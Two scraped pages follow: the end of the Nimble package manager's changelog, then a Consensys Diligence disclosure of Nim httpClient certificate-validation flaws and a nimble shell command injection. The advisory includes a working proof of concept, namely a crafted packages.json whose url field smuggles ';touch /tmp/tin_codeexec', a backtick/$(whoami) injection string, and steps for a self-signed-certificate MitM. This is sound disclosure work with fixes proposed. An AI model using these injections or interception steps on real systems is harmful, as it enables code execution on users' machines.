This is a small bug fix release which resolves problems with the installation
of Aporia (and likely other Nimble packages).

## 0.8.0 - 05/01/2017

This is a large release containing multiple new features and many bug fixes.

* Implemented a completely new output system.
  + Supports different message types and priorities. Each is differently
    encoded using a color and a brightness.
  + The amount of messages shown can be changed by using the new `--verbose`
    and `--debug` flags, by default only high priority messages are shown.
  + Duplicate warnings are filtered out to prevent too much noise.
* Package namespaces are now validated. You will see a warning whenever an
  incorrectly namespaced package is read by Nimble, this can occur either
  during installation or when the installed package database is being loaded.
  The namespacing rules are described in Nimble's
  [readme](https://github.com/nim-lang/nimble#libraries).
  **Consider these warnings to be unstable, if you see something that you
  think is incorrect please report it**.
* Special version dependencies are now installed into a directory with that
  special version in its name. For example, `compiler@#head` will be installed
  into `~/.nimble/pkgs/compiler-#head`. This reduces the amount of redundant
  installs. See [#88](https://github.com/nim-lang/nimble/issues/88) for
  more information.
* External dependencies can now be specified in .nimble files. Nimble doesn't
  install these, but does instruct the user on how they can be installed.
  More information about this feature can be found in the
  [readme](https://github.com/nim-lang/nimble#external-dependencies).
* Nimble now supports package aliases in the packages.json files.
* Fixed regression that caused transitive dependencies to not be installed.
* Fixed problem with `install` command when a `src` directory is present
  in the current directory.
* Improved quoting of process execution arguments.
* Many improvements to custom `--nimbleDir` handling. All commands should now
  support it correctly.
* Running `nimble -v` will no longer read the Nimble config before displaying
  the version.
* Refresh command now supports a package list name as argument.
* Fixes issues with symlinks not being removed correctly.
* Changed the way the `dump` command locates the .nimble file.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.7.10...v0.8.0>

Full list of issues which have been closed: <https://github.com/nim-lang/nimble/issues?utf8=%E2%9C%93&q=is%3Aissue+closed%3A%222016-10-09+..+2017-01-05%22+>

## 0.7.10 - 09/10/2016

This release includes multiple bug fixes.

* Reverted patch that breaks binary stubs in Git Bash on Windows.
* The `nimscriptapi.nim` file is now statically compiled into the binary.
  This should fix the "could not find nimscriptapi.nim" errors. The file can
  still be overridden by placing a file named `nimscriptapi.nim` inside a
  `nimblepkg` directory that is placed alongside the Nimble binary, or
  by a `nimscriptapi.nim` file inside `~/.nimble/pkgs/nimble-ver/nimblepkg/`.
  For more information see the
  [code that looks for this file](https://github.com/nim-lang/nimble/blob/v0.7.10/src/nimblepkg/nimscriptsupport.nim#L176).
* Nim files can now be imported in .nimble nimscript files. (Issue [#186](https://github.com/nim-lang/nimble/issues/186))
* Requiring a specific git commit hash no longer fails. (Issue [#129](https://github.com/nim-lang/nimble/issues/129))

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.7.8...v0.7.10>

## 0.7.8 - 28/09/2016

This is a hotfix release which fixes crashes when Nimble (or Nim) is installed
to `C:\Program Files` or other paths with spaces in them.

## 0.7.6 - 26/09/2016

This is a small release designed to coincide with the release of Nim 0.15.0.

* Fixes `--depsOnly` flag ([commit](https://github.com/nim-lang/nimble/commit/f6a19b54e47c7c99f2b473fc02915277273f8c41))
* Fixes compilation on 0.15.0.
* Fixes #239.
* Fixes #215.
* VCS information is now stored in the Nimble package metadata.

## 0.7.4 - 06/06/2016

This release is mainly a bug fix release. The installation problems
introduced by v0.7.0 should now be fixed.

* Fixed symlink install issue
  (Thank you [@yglukhov](https://github.com/yglukhov)).
* Fixed permission issue when installing packages
  (Thank you [@SSPkrolik](https://github.com/SSPkrolik)).
* Work around for issue #204.
  (Thank you [@Jeff-Ciesielski](https://github.com/Jeff-Ciesielski)).
* Fixed FD leak.
  (Thank you [@yglukhov](https://github.com/yglukhov)).
* Implemented the `--depsOnly` option for the `install` command.
* Various fixes to installation/nimscript support problems introduced by
  v0.7.0.

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.7.2...v0.7.4>

## 0.7.2 - 11/02/2016

This is a hotfix release which alleviates problems when building Nimble.

See Issue [#203](https://github.com/nim-lang/nimble/issues/203) for more
information.

## 0.7.0 - 30/12/2015

This is a major release.
Significant changes include NimScript support, configurable package list
URLs, a new `publish` command, the removal of the dependency on
OpenSSL, and proxy support. More detailed list of changes follows:

* Fixed `chcp` on Windows XP and Windows Vista
  (Thank you [@vegansk](https://github.com/vegansk)).
* Fixed incorrect command line processing
  (Issue [#151](https://github.com/nim-lang/nimble/issues/151))
* Merged `developers.markdown` back into `readme.markdown`
  (Issue [#132](https://github.com/nim-lang/nimble/issues/132))
* Removed advertising clause from license
  (Issue [#153](https://github.com/nim-lang/nimble/issues/153))
* Implemented `publish` command
  (Thank you for taking the initiative [@Araq](https://github.com/Araq))
* Implemented NimScript support. Nimble now import a portion of the Nim
  compiler source code for this.
  (Thank you for taking the initiative [@Araq](https://github.com/Araq))
* Fixes incorrect logic for finding the Nim executable
  (Issue [#125](https://github.com/nim-lang/nimble/issues/125)).
* Renamed the `update` command to `refresh`. **The `update` command will
  mean something else soon!**
  (Issue [#158](https://github.com/nim-lang/nimble/issues/158))
* Improvements to the `init` command.
  (Issue [#96](https://github.com/nim-lang/nimble/issues/96))
* Package names must now officially be valid Nim identifiers. Package's
  with dashes in particular will become invalid in the next version.
  Warnings are shown now but the **next version will show an error**.
  (Issue [#126](https://github.com/nim-lang/nimble/issues/126))
* Added error message when no build targets are present.
  (Issue [#108](https://github.com/nim-lang/nimble/issues/108))
* Implemented configurable package lists. Including fallback URLs
  (Issue [#75](https://github.com/nim-lang/nimble/issues/75)).
* Removed the OpenSSL dependency
  (Commit [ec96ee7](https://github.com/nim-lang/nimble/commit/ec96ee7709f0f8bd323aa1ac5ed4c491c4bf23be))
* Implemented proxy support. This can be configured using the `http_proxy`/
  `https_proxy` environment variables or Nimble's configuration
  (Issue [#86](https://github.com/nim-lang/nimble/issues/86)).
* Fixed issues with reverse dependency storage
  (Issue [#113](https://github.com/nim-lang/nimble/issues/113) and
  [#168](https://github.com/nim-lang/nimble/issues/168)).

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.6.2...v0.7.0>

## 0.6.4 - 30/12/2015

This is a hotfix release fixing compilation with Nim 0.12.0.

See Issue [#180](https://github.com/nim-lang/nimble/issues/180) for more
info.

## 0.6.2 - 19/06/2015

* Added `binDir` option to specify where the build output should be placed
  (Thank you [@minciue](https://github.com/minciue)).
* Fixed deprecated code (Thank you [@lou15b](https://github.com/lou15b)).
* Fixes to old `.babel` folder handling
  (Thank you [@ClementJnc](https://github.com/ClementJnc)).
* Added ability to list only the installed packages via
  `nimble list --installed` (Thank you
  [@hiteshjasani](https://github.com/hiteshjasani).
* Fixes compilation with Nim v0.11.2 (Thank you
  [@JCavallo](https://github.com/JCavallo)).
* Implements the `--nimbleDir` option (Thank you
  [@ClementJnc](https://github.com/ClementJnc)).
* [Fixes](https://github.com/nim-lang/nimble/issues/128) `nimble uninstall`
  not giving an error when no package name is
  specified (Thank you [@dom96](https://github.com/dom96)).
* [When](https://github.com/nim-lang/nimble/issues/139) installing and building
  a tagged version of a package fails, Nimble will
  now attempt to install and build the `#head` of the repo
  (Thank you [@dom96](https://github.com/dom96)).
* [Fixed](https://github.com/nim-lang/nimble/commit/1234cdce13c1f1b25da7980099cffd7f39b54326)
  cloning of git repositories with non-standard default branches
  (Thank you [@dom96](https://github.com/dom96)).

---

Full changelog: <https://github.com/nim-lang/nimble/compare/v0.6...v0.6.2>

## 0.6.0 - 26/12/2014

* Renamed from Babel to Nimble
* Introduces compatibility with Nim v0.10.0+
* Implemented the `init` command which generates a .nimble file for new
  projects. (Thank you
  [@singularperturbation](https://github.com/singularperturbation))
* Improved cloning of git repositories.
  (Thank you [@gradha](https://github.com/gradha))
* Fixes `path` command issues (Thank you [@gradha](https://github.com/gradha))
* Fixes problems with symlinking when there is a space in the path.
  (Thank you [@philip-wernersbach](https://github.com/philip-wernersbach))
* The code page will now be changed when executing Nimble binary packages.
  This adds support for Unicode in cmd.exe (#54).
* `.cmd` files are now used in place of `.bat` files. Shell files for
  Cygwin/Git bash are also now created.

## 0.4.0 - 24/06/2014

* Introduced the ability to delete packages.
* When installing packages, a list of files which have been copied is stored
  in the babelmeta.json file.
* When overwriting an already installed package babel will no longer delete
  the whole directory but only the files which it installed.
* Versions are now specified on the command line after the '@' character when
  installing and uninstalling packages. For example: `babel install foobar@0.1`
  and `babel install foobar@#head`.
* The babel package installation directory can now be changed in the new
  config.
* Fixes a number of issues.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from consensys.net_dfe46723_20250114_222953.html ===

[![Consensys Diligence](/images/logo/logo.svg)](/ "Home")

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")

# Nim - Insecure SSL/TLS Defaults, MitM, and nimble shell command injection

* [1 Summary](#summary)
* [2 Details](#details)
  + [2.1 `httpClient` - does not validate peer certificates by default](#httpclient---does-not-validate-peer-certificates-by-default)
  + [2.2 nimble - fails to validate certificates due to insecure `httpClient` defaults](#nimble---fails-to-validate-certificates-due-to-insecure-httpclient-defaults)
  + [2.3 nimble - falls back to insecure http url when fetching packages](#nimble---falls-back-to-insecure-http-url-when-fetching-packages)
  + [2.4 nimble arbitrary code execution for specially crafted package metadata](#nimble-arbitrary-code-execution-for-specially-crafted-package-metadata)
* [3 Proof of Concept](#proof-of-concept)
* [4 Proposed Fix](#proposed-fix)
* [5 Vendor Response](#vendor-response)
  + [5.1 Timeline](#timeline)
* [6 References](#references)

Request access to Fuzzing

[Book Now](https://consensys.io/diligence/fuzzing/)

| CVE | [CVE-2021-21374](https://nvd.nist.gov/vuln/detail/CVE-2021-21374)¬† [CVE-2021-21373](https://nvd.nist.gov/vuln/detail/CVE-2021-21373)¬† [CVE-2021-21372](https://nvd.nist.gov/vuln/detail/CVE-2021-21372) |
| --- | --- |
| Vendor | [nim-lang](https://nim-lang.org/) |
| Affected Versions | <= 1.2.6, nimble <=v0.12.0 |
| Vulnerability Class | CWE-295, CWE-78, CWE-348 |
| Author(s) | tintinweb |
| Date | Feb 4, 2021 |

**Vulnerability Note**

## 1 Summary

We found a couple of critical security issues in the defaults for one of the standard-lib components that allows peer-impersonation (MitM) on secure transports. This also affects the languages package manager. Additionally, the package manager is vulnerable to shell command injection when fetching remote repositories before installing packages:

* 2.1 - `httpClient` does no validate peer certificates by default (appears to be fixed in 1.4.x)
* 2.2 - the package manager `nimble` relies on the insecure `httpClient` defaults (unfixed; latest 0.12.0 has not been re-compiled with a fixed nim-c)
* 2.3 - `nimble` falls back to insecure transports if `https` is blocked (unfixed)
* 2.4 - `nimble` shell command injection when fetching a package for installation (unfixed)

**TLDR;** The Nim (`at least <=1.2.6`) `httpClient` default SSL/TLS configuration does not enforce peer certificate verification by default. Non-secure settings should not be the default as this might unexpectedly expose other projects to security risks. If you‚Äôre using `nimble <= 0.12.0` anyone can block your TLS session and it will fall back to an insecure transport. Because of the insecure `httpClient` defaults, one can also just intercept your TLS session as the peer verification is too lax. Additionally, nimble appears to be vulnerable to a direct shell command injection when installing a package (but one can as well just provide a malicious package).

## 2 Details

### 2.1 `httpClient` - does not validate peer certificates by default

**Update**: this appears to be fixed with nim 1.4.2. no CVE was provided

The `httpclient` - which is part of the nim stdlib - by default sets up an insecure ssl/tls context by specifying `verifyMode = CVerifyNone` (see [here](https://github.com/nim-lang/Nim/blob/46aacf917f39d02c96175d358e7a76fc875ea070/lib/pure/httpclient.nim#L323)). As a result, the library trusts all certificates by default as long as the `CN`/`SAN` matches the request host.

This behavior is completely insecure and unexpected as can be seen with (2.2) where the nim package manager `nimble` can trivially be intercepted to deliver malicious code or cause code execution on the client.

Example:

a) create a self-signed cert for `CN=localhost`

```
‚áí  openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

```

b) start the server `openssl s_server -cert cert.pem -key key.pem -www -accept 443`

c) connect a default nim `httpClient` to the local ssl server (self-signed, untrusted)

```
import httpClient
var client = newHttpClient()
echo client.getContent("https://localhost:443")  # default no certificate check

```

The client successfully accepts the self-signed/untrusted certificate:

```
‚áí  nim c -r -d:ssl  client_issues.nim
nim c -r -d:ssl  client_issues.nim
/Users/tintin/workspace/nim/test/config.nims(23, 3) Hint: 'pcreIncludeDir' is declared but not used [XDeclaredButNotUsed]
Hint: used config file '/usr/local/Cellar/nim/1.2.4/nim/config/nim.cfg' [Conf]
Hint: used config file '/Users/tintin/workspace/nim/test/config.nims' [Conf]
Hint: 24088 LOC; 0.049 sec; 30.754MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/httpclient/ssl/client_issues.nim; out: /Users/tintin/workspace/nim/test/issues/httpclient/ssl/client_issues [SuccessX]
Hint: /Users/tintin/workspace/nim/test/issues/httpclient/ssl/client_issues  [Exec]
<HTML><BODY BGCOLOR="#ffffff">
<pre>

s_server -cert cert.pem -key key.pem -www -accept 443
Secure Renegotiation IS supported
Ciphers supported in s_server binary
TLSv1/SSLv3:ECDHE-RSA-AES256-GCM-SHA384TLSv1/SSLv3:ECDHE-ECDSA-AES256-GCM-SHA384
TLSv1/SSLv3:ECDHE-RSA-AES256-SHA384  TLSv1/SSLv3:ECDHE-ECDSA-AES256-SHA384
TLSv1/SSLv3:ECDHE-RSA-AES256-SHA     TLSv1/SSLv3:ECDHE-ECDSA-AES256-SHA
TLSv1/SSLv3:DHE-RSA-AES256-GCM-SHA384TLSv1/SSLv3:DHE-RSA-AES256-SHA256
TLSv1/SSLv3:DHE-RSA-AES256-SHA       TLSv1/SSLv3:ECDHE-ECDSA-CHACHA20-POLY1305
TLSv1/SSLv3:ECDHE-RSA-CHACHA20-POLY1305TLSv1/SSLv3:DHE-RSA-CHACHA20-POLY1305
TLSv1/SSLv3:GOST2012256-GOST89-GOST89TLSv1/SSLv3:DHE-RSA-CAMELLIA256-SHA256
TLSv1/SSLv3:DHE-RSA-CAMELLIA256-SHA  TLSv1/SSLv3:GOST2001-GOST89-GOST89
TLSv1/SSLv3:AES256-GCM-SHA384        TLSv1/SSLv3:AES256-SHA256
TLSv1/SSLv3:AES256-SHA               TLSv1/SSLv3:CAMELLIA256-SHA256
TLSv1/SSLv3:CAMELLIA256-SHA          TLSv1/SSLv3:ECDHE-RSA-AES128-GCM-SHA256
TLSv1/SSLv3:ECDHE-ECDSA-AES128-GCM-SHA256TLSv1/SSLv3:ECDHE-RSA-AES128-SHA256
TLSv1/SSLv3:ECDHE-ECDSA-AES128-SHA256TLSv1/SSLv3:ECDHE-RSA-AES128-SHA
TLSv1/SSLv3:ECDHE-ECDSA-AES128-SHA   TLSv1/SSLv3:DHE-RSA-AES128-GCM-SHA256
TLSv1/SSLv3:DHE-RSA-AES128-SHA256    TLSv1/SSLv3:DHE-RSA-AES128-SHA
TLSv1/SSLv3:DHE-RSA-CAMELLIA128-SHA256TLSv1/SSLv3:DHE-RSA-CAMELLIA128-SHA
TLSv1/SSLv3:AES128-GCM-SHA256        TLSv1/SSLv3:AES128-SHA256
TLSv1/SSLv3:AES128-SHA               TLSv1/SSLv3:CAMELLIA128-SHA256
TLSv1/SSLv3:CAMELLIA128-SHA          TLSv1/SSLv3:ECDHE-RSA-RC4-SHA
TLSv1/SSLv3:ECDHE-ECDSA-RC4-SHA      TLSv1/SSLv3:RC4-SHA
TLSv1/SSLv3:RC4-MD5                  TLSv1/SSLv3:ECDHE-RSA-DES-CBC3-SHA
TLSv1/SSLv3:ECDHE-ECDSA-DES-CBC3-SHA TLSv1/SSLv3:EDH-RSA-DES-CBC3-SHA
TLSv1/SSLv3:DES-CBC3-SHA
---
Ciphers common between both SSL end points:
ECDHE-RSA-AES256-GCM-SHA384 ECDHE-ECDSA-AES256-GCM-SHA384 ECDHE-RSA-AES256-SHA384
ECDHE-ECDSA-AES256-SHA384  ECDHE-RSA-AES256-SHA       ECDHE-ECDSA-AES256-SHA
DHE-RSA-AES256-GCM-SHA384  DHE-RSA-AES256-SHA256      DHE-RSA-AES256-SHA
ECDHE-ECDSA-CHACHA20-POLY1305 ECDHE-RSA-CHACHA20-POLY1305 DHE-RSA-CHACHA20-POLY1305
GOST2012256-GOST89-GOST89  DHE-RSA-CAMELLIA256-SHA256 DHE-RSA-CAMELLIA256-SHA
GOST2001-GOST89-GOST89     AECDH-AES256-SHA           ADH-AES256-GCM-SHA384
ADH-AES256-SHA256          ADH-AES256-SHA             ADH-CAMELLIA256-SHA256
ADH-CAMELLIA256-SHA        AES256-GCM-SHA384          AES256-SHA256
AES256-SHA                 CAMELLIA256-SHA256         CAMELLIA256-SHA
ECDHE-RSA-AES128-GCM-SHA256 ECDHE-ECDSA-AES128-GCM-SHA256 ECDHE-RSA-AES128-SHA256
ECDHE-ECDSA-AES128-SHA256  ECDHE-RSA-AES128-SHA       ECDHE-ECDSA-AES128-SHA
DHE-RSA-AES128-GCM-SHA256  DHE-RSA-AES128-SHA256      DHE-RSA-AES128-SHA
DHE-RSA-CAMELLIA128-SHA256 DHE-RSA-CAMELLIA128-SHA    AECDH-AES128-SHA
ADH-AES128-GCM-SHA256      ADH-AES128-SHA256          ADH-AES128-SHA
ADH-CAMELLIA128-SHA256     ADH-CAMELLIA128-SHA        AES128-GCM-SHA256
AES128-SHA256              AES128-SHA                 CAMELLIA128-SHA256
CAMELLIA128-SHA            ECDHE-RSA-RC4-SHA          ECDHE-ECDSA-RC4-SHA
AECDH-RC4-SHA              ADH-RC4-MD5                RC4-SHA
RC4-MD5                    ECDHE-RSA-DES-CBC3-SHA     ECDHE-ECDSA-DES-CBC3-SHA
EDH-RSA-DES-CBC3-SHA       AECDH-DES-CBC3-SHA         ADH-DES-CBC3-SHA
DES-CBC3-SHA
---
New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID:
    Session-ID-ctx: 01000000
    Master-Key: 78B740AE8469022FB2954B52085CFE9E613E25353DFCDB25DD7A0C6CC9F380DC6414E646ADF780C473998142B52FBA14
    Start Time: 1594116548
    Timeout   : 7200 (sec)
    Verify return code: 0 (ok)
---
   0 items in the session cache
   0 client connects (SSL_connect())
   0 client renegotiates (SSL_connect())
   0 client connects that finished
   1 server accepts (SSL_accept())
   0 server renegotiates (SSL_accept())
   1 server accepts that finished
   0 session cache hits
   0 session cache misses
   0 session cache timeouts
   0 callback cache hits
   0 cache full overflows (128 allowed)
---
no client certificate available
</BODY></HTML>

```

The request succeeds while it should throw a certificate verification error instead.

It is recommended that the default context is configured with `SSL_VERIFY_PEER` and let users opt-out of this, to enforce verification of peer certificates by default.

### 2.2 nimble - fails to validate certificates due to insecure `httpClient` defaults

**Update:** still unfixed. nimble has not been rebuilt with a fixed nim-c. no CVE was provided

Nimble fetches package metadata from a `packages.json` hosted on github (main link). The package index is being fetched using the insecure default instance of `httpclient` ([here](https://github.com/nim-lang/nimble/blob/6e5761b1923ce213c2b956900591d7a6f50cde84/src/nimblepkg/packageinfo.nim#L178)) that fails to properly verify certificates when establishing secure transports. Since `httpclient` only checks `CN` and `SAN` to match but does not verify if the certificate is trusted by the host, anyone can trivially intercept the connection and deliver a malicious `packages.json` in an attempt to install or execute malicious code on a client machine.

### 2.3 nimble - falls back to insecure http url when fetching packages

**Update:** still unfixed. nimble has not been rebuilt with a fixed nim-c. no CVE was provided

While intercepting a call to `nimble refresh` with a spoofed certificate that does not match the url we ran into an `SSL Certificate check failed` error. When encountering this error nimble falls back to an insecure alternative url: <http://irclogs.nim-lang.org/packages.json>

This request can trivially be intercepted to cause code execution or deliver malicious packages to the client. It should also be noted that a secure endpoint for `packages.json` would be available: <https://irclogs.nim-lang.org/packages.json>

```
‚áí  nimble refresh --debug
nimble refresh --debug
Downloading Official package list
     Trying https://github.com/nim-lang/packages/raw/master/packages.json
   Warning: Could not download: SSL Certificate check failed.
     Trying http://irclogs.nim-lang.org/packages.json
    Success Package list downloaded.
   Warning: Not removing temporary path because of debug verbosity: /var/folders/ht/x3vxy7p11q3fcr7wzf46dgsc0000gn/T/nimble_14789

```

Note that a man-in-the-middle can trivially force SSL certificate checks to fail in order to downgrade the connection to the insecure `http` link and modify the `package.json`

### 2.4 nimble arbitrary code execution for specially crafted package metadata

**Update:** still unfixed. nimble has not been rebuilt with a fixed nim-c. no CVE was provided

Nimbles `doCmd` and `doCmdEx` methods rely on [osproc.execCmd](https://nim-lang.org/docs/osproc.html#execCmd%2Cstring) which basically works like a call to `system(shellcmd)`. The command may spawn a shell and allow arbitrary commands to be executed. The command does not take arguments and solely relies on the user to properly shell-escape command from args. This is inherently insecure and shifts the burden of properly sanitizing potential user input to the developer.

`doCmd*` is called in various places. One of it being `checkUrlType(string url)` ([here](https://github.com/nim-lang/nimble/blob/b3abee937dad1012493a195c6c3531693caf8f7c/src/nimblepkg/download.nim#L137)) which is called by `getDownloadInfo()` ([here](https://github.com/nim-lang/nimble/blob/83eb194d9ba20fdfc8d0905acd4bda5c4e19e542/src/nimble.nim#L481)). `checkUrlType` takes the `url` from the package metadata and this `url` may contain harmful sequences.

```
var url = parseUri("https://google.com/`whoami`$(whoami);whoami")  # this parses just fine

```

and may end up in one of the many calls to `doCmd`:

```
proc checkUrlType*(url: string): DownloadMethod =
  ## Determines the download method based on the URL.
  if doCmdEx("git ls-remote " & url).exitCode == QuitSuccess:
...

```

Here‚Äôs one PoC to directly execute shell commands:

1. Intercept client to provide a malicious `package.json` (similar setup to what is outlined in the Proof of Concept section)

**Note** `url` has a trailing shell command.

```
GET /nim-lang/packages/raw/master/packages.json HTTP/1.1
Host: github.com
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

HTTP/1.1 200 OK
Date: Sun, 18 Oct 2012 10:36:20 GMT
Server: Apache/2.2.14 (Win32)
Content-Length: 420
Content-Type: application/json; charset=iso-8859-1
Connection: Closed

[
  {
    "name": "filesize",
    "url": "https://google.com/;touch /tmp/tin_codeexec",
    "method": "git",
    "tags": [
      "filesize",
      "size"
    ],
    "description": "A Nim package to convert filesizes into other units, and turns filesizes into human readable strings.",
    "license": "MIT",
    "web": "https://github.com/sergiotapia/filesize",
    "doc": "https://github.com/sergiotapia/filesize"
  }
]

```

2. update package list and install `filesize` (may affect any command that attempts to download the git repository for that package)

```
‚áí  nimble refresh --debug
Downloading Official package list
     Trying https://github.com/nim-lang/packages/raw/master/packages.json
    Success Package list downloaded.
   Warning: Not removing temporary path because of debug verbosity: /var/folders/ht/x3vxy7p11q3fcr7wzf46dgsc0000gn/T/nimble_530

```

install `filesize` to trigger the vulnerable codepath:

```
‚áí  nimble install filesize
Downloading https://google.com/;touch /tmp/tin_codeexec using git
       Tip: 1 messages have been suppressed, use --verbose to show them.
     Error: Specified directory (/var/folders/ht/x3vxy7p11q3fcr7wzf46dgsc0000gn/T/nimble_585/googlecom_touchtmptincodeexec) does not contain a .nimble file.

```

command was executed:

```
‚áí  ls /tmp/tin_codeexec
/tmp/tin_codeexec

```

There‚Äôs probably other ways this may be insecure as well (path traversal, etc..)

## 3 Proof of Concept

We are going to exploit [nimble](https://github.com/nim-lang/nimble) the official nim package manager for this Proof of Concept demonstrating that `httpclient` fails to properly verify the tls peer certificate silently allowing anyone to impersonate any host.

Nimble fetches packages from github. This is using the nim-lang stdlib `httpclient` ([here](https://github.com/nim-lang/nimble/blob/6e5761b1923ce213c2b956900591d7a6f50cde84/src/nimblepkg/packageinfo.nim#L178)) that fails to properly verify certificates when establishing secure transports. By default, nimble requests the package list from `https://github.com/nim-lang/packages/raw/master/packages.json`. Intercepting a call to `packages.json` may allow an attacker to define what binaries are installed and may also directly lead to code execution on the machine that is executing nimble.

1. Change your `/etc/hosts` file to redirect github.com to localhost

```
‚áí  sudo cat /private/etc/hosts
127.0.0.1 github.com

```

2. Create a self-signed certificate for `CN=github.com`

```
‚áí  openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout privateKey.key -out certificate.crt

```

3. run `nimble refresh --debug` and wait for a connection on the local ssl server.

Output: nimble requesting `/nim-lang/packages/raw/master/packages.json` after successfully establishing a connection to the fake `github.com` server.

```
‚áí  nimble refresh --debug
nimble refresh --debug
Downloading Official package list
     Trying https://github.com/nim-lang/packages/raw/master/packages.json
    Success Package list downloaded.
   Warning: Not removing temporary path because of debug verbosity: /var/folders/ht/x3vxy7p11q3fcr7wzf46dgsc0000gn/T/nimble_16559

```

Spoofed github server running on 127.0.0.1:

```
‚áí  openssl s_server  -cert certificate.crt -key privateKey.key  -accept 443
Using auto DH parameters
Using default temp ECDH parameters
ACCEPT
-----BEGIN SSL SESSION PARAMETERS-----
MGMCAQECAgMDBALAMAQABDAGINA1HSSDBK3NwY+4TQxGDQUsuG4dNw9L3TMybjyP
grEKxQ5hM5KHvZeJVJjOBBKhBgIEXwRQwaIEAgIcIKQGBAQBAAAApgwECmdpdGh1
Yi5jb20=
-----END SSL SESSION PARAMETERS-----
Shared ciphers:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:GOST2012256-GOST89-GOST89:DHE-RSA-CAMELLIA256-SHA256:DHE-RSA-CAMELLIA256-SHA:GOST2001-GOST89-GOST89:AECDH-AES256-SHA:ADH-AES256-GCM-SHA384:ADH-AES256-SHA256:ADH-AES256-SHA:ADH-CAMELLIA256-SHA256:ADH-CAMELLIA256-SHA:AES256-GCM-SHA384:AES256-SHA256:AES256-SHA:CAMELLIA256-SHA256:CAMELLIA256-SHA:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-CAMELLIA128-SHA256:DHE-RSA-CAMELLIA128-SHA:AECDH-AES128-SHA:ADH-AES128-GCM-SHA256:ADH-AES128-SHA256:ADH-AES128-SHA:ADH-CAMELLIA128-SHA256:ADH-CAMELLIA128-SHA:AES128-GCM-SHA256:AES128-SHA256
CIPHER is ECDHE-RSA-AES256-GCM-SHA384
Secure Renegotiation IS supported
GET /nim-lang/packages/raw/master/packages.json HTTP/1.1
Host: github.com
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

HTTP/1.1 200 OK
Date: Sun, 18 Oct 2012 10:36:20 GMT
Server: Apache/2.2.14 (Win32)
Content-Length: 416
Content-Type: application/json; charset=iso-8859-1
Connection: Closed

[
  {
    "name": "filesize",
    "url": "https://github.com/sergiotapia/filesize",
    "method": "git",
    "tags": [
      "filesize",
      "size"
    ],
    "description": "A Nim package to convert filesizes into other units, and turns filesizes into human readable strings.",
    "license": "MIT",
    "web": "https://github.com/sergiotapia/filesize",
    "doc": "https://github.com/sergiotapia/filesize"
  }
]

```

The connection was intercepted delivering a potentially malicious `packages.json`.

## 4 Proposed Fix

* Certificates should always be verified by default. This is industry standard and any deviation should require the developer to consciously disable a security feature. Developer may not even expect that this feature to be disabled as many other programming languages default to secure settings.
* Nimble: Never downgrade/fall-back to insecure `http` requests unless explicitly requested by the user.
* Nimble: Add HSTS/cert pinning to increase security
* Nimble: Rework the `doCmd` to counter command-injection vectors

## 5 Vendor Response

Vendor response: Official Security Advisories: [Advisory:CVE-2021-21374](https://github.com/nim-lang/security/security/advisories/GHSA-c2wm-v66h-xhxx), [Advisory:CVE-2021-21373](https://github.com/nim-lang/security/security/advisories/GHSA-8w52-r35x-rgp8), [Advisory:CVE-2021-21372](https://github.com/nim-lang/security/security/advisories/GHSA-rg9f-w24h-962p)

### 5.1 Timeline

```
JUL/09/2020 - contact nim developers @telegram; provided details, PoC
FEB/04/2021 - deadline met. full disclosure.
MAR/26/2021 - vendor advisories:

```
## 6 References

* [1] <https://nim-lang.org/>
* [2] <https://nim-lang.org/install.html>
* [3] [https://en.wikipedia.org/wiki/Nim\_(programming\_language)](https://en.wikipedia.org/wiki/Nim_%28programming_language%29)

![](/images/home/icon-ili-xs.png)

Request a Security Review Today

Get in touch with our team to request a quote for a smart contract audit.

[Contact Us](/contact/)

![](/images/home/icon-ili-outline-white.svg)

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")
[Careers](https://consensys.io/open-roles/?discipline=32525 "Careers")
[Privacy Policy](/privacy-policy/ "Privacy Policy")

Subscribe to Our Newsletter

Stay up-to-date on our latest offerings, tools, and the world of blockchain security.

[![](/images/home/powered-by.svg)](https://consensys.io)


